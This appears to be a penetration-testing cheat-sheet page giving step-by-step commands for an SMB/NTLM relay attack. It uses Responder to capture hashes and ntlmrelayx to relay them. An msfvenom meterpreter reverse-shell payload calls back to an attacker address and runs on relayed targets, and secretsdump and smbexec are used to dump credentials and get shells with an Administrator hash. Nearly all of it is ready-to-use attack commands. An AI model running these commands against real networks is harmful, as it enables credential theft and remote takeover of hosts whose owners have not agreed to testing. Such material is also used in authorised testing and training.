# SMB Replay

## SMB Replay&#x20;

* Check if we have a target for SMB relay.&#x20;

{% code overflow="wrap" %}
```bash
# Change the IP range for your target

crackmapexec smb 10.0.0.0/24 --gen-relay-list /tmp/targets.txt
```
{% endcode %}

* Check the SMB signing requirement. You should look for a host with **445 port open and Message signing enabled but not required** or **Message signing is disabled**.

```
nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
```

<figure><img src="../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

* Start Responder. Ensure you disable **SMB server** and **HTTP server** on conf.&#x20;

{% code overflow="wrap" %}
```bash
# Ensure you configured the /etc/responder/Responder.conf file to disable SMB server and HTTP server. 

sudo responder -I eth0 -PvdDw

# For -e option (execute), you will get a reverse shell.
Kali> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.208 LPORT=80 -f exe -o rshell.exe
Kali> sudo msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set AutoRunScript post/windows/manage/migrate;set LHOST 10.0.0.208 ;set LPORT 80;run -j"
# then, run Responder
sudo responder -I eth0 -PvdDw 
```
{% endcode %}

* Start NTLM relay.&#x20;

{% code overflow="wrap" %}
```bash
ntlmrelayx.py -smb2support -tf attacklist.txt

# -e option
ntlmrelayx.py -smb2support -tf /tmp/targets.txt -e ./rshell.exe --no-http-server
```
{% endcode %}

* Login to a vulnerable target and access to the Kali SMB file share.

```bash
# From Target Windows, connect back to Kali. 
CMD> Copy a.txt \\10.0.0.208\smb 
```

<figure><img src="../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

If you get an Administrator credential (NTLM hash), try the following commands.&#x20;

{% code overflow="wrap" %}
```bash
Kali> proxychains4 -q secretsdump.py FILE01/Administrator:anypassword@10.0.0.59
Kali> proxychains4 -q smbexec.py FILE01/Administrator:anypassord@10.0.0.59
```
{% endcode %}
